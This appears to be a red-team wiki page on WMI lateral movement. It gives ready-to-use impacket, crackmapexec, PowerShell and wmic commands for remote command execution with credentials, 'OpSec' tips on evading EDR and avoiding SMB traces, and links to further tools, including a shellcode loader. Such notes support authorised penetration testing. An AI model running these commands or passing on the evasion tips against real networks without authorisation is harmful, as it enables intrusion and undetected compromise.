title: WMI Lateral Movement

[[notes/lateral-movement/index]] over [[notes/network/wmi]].

The classic method uses the *Win32_Process* class to execute a command that writes the output to file and download the output via SMB.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-wmiexec -shell-type powershell -k -no-pass srv01.corp.local
    impacket-wmiexec -shell-type powershell -silentcommand -nooutput -k -no-pass srv01.corp.local "$(< ./shell.ps1)"
    ~~~

    **OpSec:**
    When `-silentcommand` is specified the command is not execute with `cmd.exe`.
    When `-nooutput` is specified the output is not written to a file and no SMB connection is made.

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.local -u jdoe -p 'passw0rd' --exec-method wmiexec -x 'whoami /all'
    ~~~

    **OpSec:** Many EDRs detecte the use of `-X`.

=== "PowerShell"
    ~~~ powershell
    $c = New-Object System.Management.Automation.PSCredential -ArgumentList ('jdoe', (ConvertTo-SecureString 'passw0rd' -AsPlainText -Force))
    Invoke-WmiMethod -Credential $c -Class Win32_Process -Name Create -ArgumentList 'whoami /all' -ComputerName srv01.corp.local
    ~~~

=== "builtin"
    ~~~ bat
    wmic.exe /node:srv01.corp.local /user:"corp\jdoe" /password:"passw0rd" process call create "whoami /all 1> C:\Windows\Temp\out.txt 2>&1"
    ~~~

Untested tools:

- [PerfExec](https://github.com/0xthirteen/PerfExec), DLL execution trough Performance Monitor, see [Performance, Diagnostics, and WMI](http://web.archive.org/web/20230712054613/https://scribe.rip/@specterops/performance-diagnostics-and-wmi-21f3e01790d3)
- [wmiexec](https://github.com/WKL-Sec/wmiexec/), command execution by creating scheduled task over WMI, no SMB interaction
- [wmiexec-pro](https://github.com/XiaoliChan/wmiexec-Pro), command execution with output retrieval and file upload/download, no SMB interaction
- [LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake), creates a WMI event filter that executes VBScript that loads a .NET assembly that executes your shellcode
